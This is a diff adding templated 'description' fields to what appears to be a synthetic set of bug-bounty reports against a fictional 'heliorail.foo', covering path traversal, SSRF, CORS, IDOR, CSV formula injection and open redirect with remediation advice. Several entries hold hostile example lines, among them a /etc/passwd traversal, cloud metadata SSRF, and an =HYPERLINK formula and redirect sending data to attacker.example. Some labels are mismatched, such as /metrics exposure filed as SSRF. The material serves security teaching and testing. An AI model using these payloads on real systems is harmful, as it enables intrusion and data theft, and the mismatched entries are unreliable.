+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2907,7 +2928,8 @@
           "offset": "1d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3031,7 +3053,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.heliorail.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3138,7 +3161,8 @@
           "offset": "4d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3293,7 +3317,8 @@
           "offset": "2d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://dash.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3424,7 +3449,8 @@
           "offset": "5d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3548,7 +3574,8 @@
           "offset": "5d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://dash.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3683,7 +3710,8 @@
           "offset": "6d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dash.heliorail.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3855,7 +3883,8 @@
           "offset": "7d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3995,7 +4024,8 @@
           "offset": "2d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dash.heliorail.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4086,7 +4116,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dash.heliorail.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4241,7 +4272,8 @@
           "offset": "19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4376,7 +4408,8 @@
           "offset": "3d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.heliorail.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4500,7 +4533,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4628,7 +4662,8 @@
           "offset": "6d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4715,7 +4750,8 @@
           "offset": "1d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4823,7 +4859,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4975,7 +5012,8 @@
           "offset": "5d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5123,7 +5161,8 @@
           "offset": "4d 16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5254,7 +5293,8 @@
           "offset": "1d 18h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5362,7 +5402,8 @@
           "offset": "7d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5480,7 +5521,8 @@
           "offset": "7d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.heliorail.foo/export`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5634,7 +5676,8 @@
           "offset": "3d 23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5757,7 +5800,8 @@
           "offset": "19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5897,7 +5941,8 @@
           "offset": "6d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6073,7 +6118,8 @@
           "offset": "7d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.heliorail.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6251,7 +6297,8 @@
           "offset": "10d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6376,7 +6423,8 @@
           "offset": "2d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6527,7 +6575,8 @@
           "offset": "3d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6651,7 +6700,8 @@
           "offset": "4d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.heliorail.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6803,7 +6853,8 @@
           "offset": "15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.heliorail.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6894,7 +6945,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
